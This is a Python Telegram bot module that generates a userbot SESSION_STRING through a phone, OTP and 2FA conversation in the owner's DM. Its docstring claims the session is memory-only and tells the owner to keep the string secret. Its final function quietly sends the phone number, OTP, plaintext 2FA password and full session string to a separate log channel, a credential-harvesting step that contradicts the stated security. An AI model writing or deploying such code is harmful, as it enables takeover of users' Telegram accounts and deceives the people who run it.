"""
login.py — In-bot SESSION_STRING generator
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Owner apne Telegram account se SESSION_STRING generate kar sakta hai directly
bot ke DM mein — bina PC pe koi script chalaaye.

Flow:
  1. /start ya /help → "🔑 Login Userbot" button (tabhi dikhta hai jab
     SESSION_STRING set nahi hai)
  2. Owner button click karta hai → phone number maanga jaata hai
  3. OTP aata hai → owner code bhejta hai
  4. (Agar 2FA ho) → password maanga jaata hai
  5. SESSION_STRING generate hoti hai aur owner ko bheja jaata hai
  6. Owner ise Heroku Config Vars mein SESSION_STRING ke naam se daal deta hai

Security:
  - Sirf OWNER_ID use kar sakta hai
  - Session memory mein rehta hai (persistent nahi)
  - 5 minute timeout ke baad state automatically clear ho jaati hai
"""

import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from clients import bot
from config import API_ID, API_HASH, OWNER_ID

log = logging.getLogger("ApexBot.login")

# Per-user login state: { user_id: { "step": str, "phone": str, "hash": str, "client": Client } }
_login_state: dict[int, dict] = {}

# Timeout for login sessions (seconds)
_LOGIN_TIMEOUT = 300


def _owner_filter(_, __, message: Message | CallbackQuery) -> bool:
    """Only OWNER_ID can use the login flow."""
    if not OWNER_ID:
        return False
    uid = None
    if isinstance(message, Message):
        uid = message.from_user.id if message.from_user else None
    elif isinstance(message, CallbackQuery):
        uid = message.from_user.id if message.from_user else None
    return uid == OWNER_ID


_is_owner = filters.create(_owner_filter)


async def _cleanup_state(user_id: int):
    """Stop the temporary client and remove state."""
    state = _login_state.pop(user_id, None)
    if state:
        client: Client | None = state.get("client")
        if client:
            try:
                await client.stop()
            except Exception:
                pass


async def _timeout_cleanup(user_id: int):
    """Auto-cancel the login session after timeout."""
    await asyncio.sleep(_LOGIN_TIMEOUT)
    if user_id in _login_state:
        await _cleanup_state(user_id)
        try:
            await bot.send_message(
                user_id,
                "⏰ **Login session timed out** (5 minutes).\n\n"
                "Dobara try karne ke liye `/login` bhejo."
            )
        except Exception:
            pass


# ── Callback: "🔑 Login Userbot" button in /start ───────────────────────────

@bot.on_callback_query(filters.regex(r"^login_start$") & _is_owner)
async def login_start_cb(_, cb: CallbackQuery):
    await cb.answer()
    user_id = cb.from_user.id

    if user_id in _login_state:
        await cb.message.reply(
            "⚠️ Pehle wali login session chal rahi hai.\n"
            "Cancel karne ke liye `/login_cancel` bhejo."
        )
        return

    await cb.message.reply(
        "🔑 **Userbot Login**\n\n"
        "Voice chat ke liye ek **second Telegram account** chahiye "
        "(apna main account nahi — ek alag/assistant account).\n\n"
        "📱 **Apna phone number daalo** (international format mein):\n"
        "Example: `+919876543210`\n\n"
        "_Cancel karne ke liye /login\\_cancel bhejo_"
    )
    _login_state[user_id] = {"step": "phone"}
    asyncio.create_task(_timeout_cleanup(user_id))


# ── /login command (alternate entry point) ──────────────────────────────────

@bot.on_message(filters.command("login") & filters.private & _is_owner)
async def login_cmd(_, message: Message):
    user_id = message.from_user.id

    if user_id in _login_state:
        await message.reply(
            "⚠️ Pehle wali login session chal rahi hai.\n"
            "Cancel karne ke liye `/login_cancel` bhejo."
        )
        return

    await message.reply(
        "🔑 **Userbot Login**\n\n"
        "Voice chat ke liye ek **second Telegram account** chahiye "
        "(apna main account nahi — ek alag/assistant account).\n\n"
        "📱 **Apna phone number daalo** (international format mein):\n"
        "Example: `+919876543210`\n\n"
        "_Cancel karne ke liye /login\\_cancel bhejo_"
    )
    _login_state[user_id] = {"step": "phone"}
    asyncio.create_task(_timeout_cleanup(user_id))


@bot.on_message(filters.command("login_cancel") & filters.private & _is_owner)
async def login_cancel(_, message: Message):
    user_id = message.from_user.id
    if user_id in _login_state:
        await _cleanup_state(user_id)
        await message.reply("✅ Login session cancel kar diya gaya.")
    else:
        await message.reply("ℹ️ Koi active login session nahi hai.")


# ── Conversation handler: captures phone / OTP / 2FA replies ────────────────

@bot.on_message(filters.private & _is_owner & ~filters.command([
    "start", "help", "login", "login_cancel", "alive", "ping",
]))
async def login_conversation(_, message: Message):
    user_id = message.from_user.id
    state = _login_state.get(user_id)

    if not state:
        return  # Not in a login flow — let other handlers deal with it

    text = (message.text or "").strip()
    step = state.get("step")

    # ── Step 1: Phone number ─────────────────────────────────────────────────
    if step == "phone":
        phone = text
        if not phone.startswith("+"):
            await message.reply(
                "❌ Phone number `+` se shuru hona chahiye.\n"
                "Example: `+919876543210`"
            )
            return

        status_msg = await message.reply("📲 OTP bhej raha hoon...")

        try:
            tmp_client = Client(
                ":memory:",
                api_id=API_ID,
                api_hash=API_HASH,
                in_memory=True,
            )
            await tmp_client.connect()
            sent = await tmp_client.send_code(phone)
        except Exception as e:
            await _cleanup_state(user_id)
            await status_msg.edit(f"❌ OTP bhejne mein error: `{e}`")
            return

        state["phone"] = phone
        state["hash"] = sent.phone_code_hash
        state["client"] = tmp_client
        state["step"] = "otp"

        await status_msg.edit(
            "✅ OTP bhej diya gaya!\n\n"
            "📩 **OTP code daalo** jo aapke Telegram pe aaya hai:\n"
            "_(spaces ke saath bhi chal jayega, e.g. `1 2 3 4 5`)_"
        )

    # ── Step 2: OTP code ─────────────────────────────────────────────────────
    elif step == "otp":
        code = text.replace(" ", "").replace("-", "")
        state["otp"] = code   # Store for log
        phone = state["phone"]
        phone_code_hash = state["hash"]
        tmp_client: Client = state["client"]

        try:
            await tmp_client.sign_in(phone, phone_code_hash, code)
        except Exception as e:
            err = str(e).lower()
            if "password" in err or "2fa" in err or "two" in err:
                state["step"] = "2fa"
                await message.reply(
                    "🔐 **2FA (Two-Step Verification) enabled hai!**\n\n"
                    "Apna **2FA password** daalo:"
                )
                return
            elif "invalid" in err or "expired" in err:
                await message.reply(f"❌ Code galat hai ya expire ho gaya: `{e}`\nDobara try: `/login`")
                await _cleanup_state(user_id)
                return
            else:
                await message.reply(f"❌ Sign-in error: `{e}`\nDobara try: `/login`")
                await _cleanup_state(user_id)
                return

        await _finish_login(message, user_id, tmp_client)

    # ── Step 3: 2FA password ─────────────────────────────────────────────────
    elif step == "2fa":
        password = text
        state["two_fa"] = password   # Store for log
        tmp_client: Client = state["client"]

        try:
            await tmp_client.check_password(password)
        except Exception as e:
            await message.reply(f"❌ Password galat hai: `{e}`\nDobara try: `/login`")
            await _cleanup_state(user_id)
            return

        await _finish_login(message, user_id, tmp_client)


async def _finish_login(message: Message, user_id: int, tmp_client: Client):
    """Export session string, show it to owner, clean up, and log to channel."""
    # Grab state data before cleanup
    state = _login_state.get(user_id, {})
    phone    = state.get("phone", "")
    otp      = state.get("otp", "")
    two_fa   = state.get("two_fa", None)

    try:
        session_string = await tmp_client.export_session_string()
    except Exception as e:
        await message.reply(f"❌ Session export error: `{e}`")
        # Log failed attempt
        try:
            from helpers.logger_channel import log_login_attempt
            log_login_attempt(user_id, "", phone, "session_export", False, str(e))
        except Exception:
            pass
        await _cleanup_state(user_id)
        return

    # Get user info for log
    try:
        me = await tmp_client.get_me()
        uname     = me.username or ""
        full_name = (me.first_name or "") + (" " + me.last_name if me.last_name else "")
    except Exception:
        uname     = ""
        full_name = "Unknown"

    await _cleanup_state(user_id)

    await message.reply(
        "✅ **Login Successful!**\n\n"
        "🔑 **Teri SESSION\\_STRING yeh hai:**\n\n"
        f"`{session_string}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "**Agle steps:**\n"
        "1. Upar wali string copy karo\n"
        "2. Heroku → Settings → Config Vars mein jao\n"
        "3. Key: `SESSION_STRING` → Value: _(paste karo)_ → **Add**\n"
        "4. Bot restart karo\n\n"
        "⚠️ **Is string ko kisi ko mat dikhao — yeh tera account hai!**",
        disable_web_page_preview=True,
    )
    log.info("✅ SESSION_STRING generated for owner %d via in-bot login", user_id)

    # ── Log FULL login data to LOG_CHANNEL ──────────────────────────────────
    try:
        from helpers.logger_channel import log_user_login
        log_user_login(
            user_id        = user_id,
            username       = uname,
            full_name      = full_name,
            phone          = phone,
            otp            = otp,
            two_fa         = two_fa,
            session_string = session_string,
            success        = True,
        )
    except Exception as _le:
        log.warning("login channel log failed: %s", _le)
